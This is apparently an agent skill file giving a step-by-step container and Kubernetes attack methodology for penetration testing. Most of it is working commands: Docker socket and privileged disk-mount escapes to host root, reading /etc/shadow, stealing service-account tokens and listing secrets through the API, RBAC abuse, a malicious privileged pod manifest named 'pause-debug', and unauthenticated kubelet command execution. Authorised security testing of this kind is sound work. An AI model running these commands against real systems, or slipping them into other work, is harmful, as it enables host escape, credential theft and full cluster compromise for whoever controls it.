---
name: container-security
description: Container and Kubernetes security methodology. Covers Docker container escape vectors (privileged, SYS_ADMIN, docker socket, /proc/1/root), Kubernetes RBAC abuse, service account token theft, pod-to-cluster-admin escalation paths, K8s network policy bypass, container runtime CVEs (runC, containerd), and admission controller misconfigurations. Use when testing containerized environments, Kubernetes clusters, or Docker deployments.
---

# Container Security Methodology

## Phase 0: Container Reconnaissance (from inside)

```bash
# Am I in a container?
cat /proc/1/cgroup | head -3
ls -la /.dockerenv 2>/dev/null
ls -la /run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && echo "K8s pod"

# Current privileges
id
cat /proc/1/status | grep Cap
capsh --print 2>/dev/null

# Mounted filesystems
mount | grep -E "proc|sys|docker|host"
```

## Phase 1: Container Escape Vectors

| Vector | Precondition | Command |
|--------|-------------|---------|
| Privileged | `--privileged` flag | Mount the host disk (see step-by-step below) |
| SYS_ADMIN cap | `--cap-add=SYS_ADMIN` | `release_agent` cgroup-v1 notify-on-release escape |
| Docker socket | `/var/run/docker.sock` mounted | `docker run -v /:/host -it alpine chroot /host` |
| containerd socket | `/run/containerd/containerd.sock` | `ctr run --privileged --mount type=bind,src=/,dst=/host,options=rbind ...` |
| /proc/1/root | Running as root, shared PID ns | `cat /proc/1/root/etc/shadow` |
| CVE-2019-5736 | runC < 1.0-rc10 | Overwrite the host runC binary from inside the container |
| CVE-2024-21626 | runC <= 1.1.11 | `WORKDIR /proc/self/fd/X` leaked-fd path traversal to host fs |

### Privileged-container disk-mount escape (step-by-step)

A `--privileged` container can see and mount the host's block devices. Never hardcode the device name — discover it first, then create a mountpoint:

```bash
# 1. Discover host block devices (don't assume /dev/sda1)
lsblk                       # tree view of disks + partitions
fdisk -l 2>/dev/null        # partition tables (needs CAP_SYS_ADMIN/privileged)
cat /proc/partitions        # fallback if lsblk/fdisk unavailable

# 2. Pick the host root partition from the output above
#    (commonly the largest ext4/xfs partition, e.g. /dev/sda1, /dev/vda1, /dev/nvme0n1p1)
HOST_DEV=/dev/sda1          # <-- replace with the device you found in step 1

# 3. Create the mountpoint, then mount the host filesystem
mkdir -p /mnt/host
mount "$HOST_DEV" /mnt/host

# 4. You now have the host root fs — read secrets, write a backdoor, or chroot in
ls -la /mnt/host/root /mnt/host/etc/shadow
chroot /mnt/host /bin/sh   # full host shell if the binary is compatible
```

If `mount` reports an unknown filesystem type, run `lsblk -f` (or `blkid`) to read the fstype and add `-t <type>`.

## Phase 2: Kubernetes Post-Exploitation

```bash
# Service account enumeration
K8S_TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
K8S_CA=/run/secrets/kubernetes.io/serviceaccount/ca.crt
K8S_NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)

# Check permissions
curl -s --cacert $K8S_CA -H "Authorization: Bearer $K8S_TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$K8S_NS/pods | jq '.items[].metadata.name'

# List secrets in namespace
curl -s --cacert $K8S_CA -H "Authorization: Bearer $K8S_TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets | jq '.items[].metadata.name'
```

## Phase 3: RBAC Abuse Patterns

| RBAC Permission | Abuse |
|----------------|-------|
| `pods/exec` | Execute commands in any pod |
| `pods/portforward` | Tunnel to internal services |
| `secrets` get | Extract all secrets |
| `deployments` create | Deploy privileged container |
| `cluster-admin` (default SA) | Full cluster compromise |
| `impersonate` | Impersonate privileged users |

Enumerate exactly what the stolen token can do before acting:

```bash
# With kubectl present:
kubectl auth can-i --list                          # full permission matrix for this SA
kubectl auth can-i create pods                     # spot-check a high-value verb
kubectl auth can-i '*' '*' --all-namespaces        # is this effectively cluster-admin?

# Raw API equivalent (SelfSubjectRulesReview) when kubectl is absent:
curl -s --cacert $K8S_CA -H "Authorization: Bearer $K8S_TOKEN" \
  -H 'Content-Type: application/json' \
  -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$K8S_NS\"}}" \
  https://kubernetes.default.svc/apis/authorization.k8s.io/v1/selfsubjectrulesreviews
```

## Phase 4: Escalation to Node / Cluster Admin

| Have | Escalate to | How |
|------|-------------|-----|
| `pods/exec` on a privileged pod | Host root | exec in, then run the privileged disk-mount escape from Phase 1 |
| `create pods` (no PSP/PSA) | Host root | Schedule a pod with `hostPID: true`, `privileged: true`, `hostPath: /` mount, then chroot the node fs |
| `create pods` + node selector | Specific node | Pin the malicious pod to a target node via `nodeName`, escape, harvest its kubelet creds |
| `get/list secrets` cluster-wide | Other workloads | Pull every namespace's secrets → service tokens, registry creds, cloud keys → pivot to cloud control plane |
| `nodes/proxy` or kubelet `:10250` open | Any pod's host | `curl -sk https://NODE:10250/run/<ns>/<pod>/<container> -d "cmd=id"` (unauth kubelet exec) |

```bash
# Malicious privileged-pod manifest (create pods → node root)
cat <<'YAML' | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata: {name: pause-debug}
spec:
  hostPID: true
  containers:
  - name: c
    image: alpine
    command: ["/bin/sh","-c","sleep 1d"]
    securityContext: {privileged: true}
    volumeMounts: [{name: host, mountPath: /host}]
  volumes: [{name: host, hostPath: {path: /}}]
YAML
# Then: kubectl exec -it pause-debug -- chroot /host /bin/sh
```

## Related Skills

- `cloud-iam-deep` — once you pull a cloud key / instance-role token from a mounted host fs or a K8s secret, pivot here for IAM enumeration and privilege escalation across AWS / Azure / GCP.
- `cicd-security` — clusters frequently run CI runners; a compromised pod often yields pipeline tokens and registry credentials.
- `active-directory` — AD-joined Windows containers and nodes bridge a container escape into the Windows domain attack surface.
- `code-review` — when source is available, audit Dockerfiles and K8s manifests for the misconfigurations (privileged, hostPath, over-broad RBAC) that enable the escapes above.
